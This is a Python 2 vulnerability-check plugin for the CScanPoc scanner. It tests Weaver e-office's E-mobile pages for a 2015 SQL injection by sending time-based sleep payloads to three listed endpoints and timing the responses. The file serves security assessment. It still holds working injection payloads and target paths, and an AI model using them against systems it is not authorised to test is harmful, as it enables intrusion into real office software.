# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'weaver_0051' # 平台漏洞编号，留空
    name = '泛微e-office SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-22'  # 漏洞公布时间
    desc = '''
        泛微 e-office 存在多处 bool盲注漏洞：
        E-mobile/source_page.php?pagediff=email&emailid=1
        E-mobile/emailreply_page.php?detailid=1
        E-mobile/email_page.php?detailid=1
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7f5cbab4-7398-429d-8add-75d8c1fd7a73'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer: http://www.wooyun.org/bugs/wooyun-2015-0104782
            hh = hackhttp.hackhttp()
            arg = self.target
            vun_urls=[
                '/E-mobile/source_page.php?pagediff=email&emailid=1',
                '/E-mobile/emailreply_page.php?detailid=1',
                '/E-mobile/email_page.php?detailid=1'
            ]
            ture = "%20xor%201%3Dif%281%2Csleep%280%29%2C1%29%20limit%201"
            flase = "%20xor%201%3Dif%281%2Csleep%285%29%2C1%29%20limit%201"
            for vun_url in vun_urls:
                start_ture = time.time()
                code0, head, res, errcode, finalurl = hh.http(arg + vun_url + ture)
                end_ture = time.time()
                ture_time = end_ture - start_ture
                start_flase = time.time()

                code5, head, res, errcode, finalurl = hh.http(arg + vun_url + flase)
                end_flase = time.time()
                flase_time = end_flase - start_flase
                if code0 == 200 and code5 == 200 and flase_time > 5 and 2 > ture_time:
                    #security_hole("bool sql inject:"+arg+vun_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
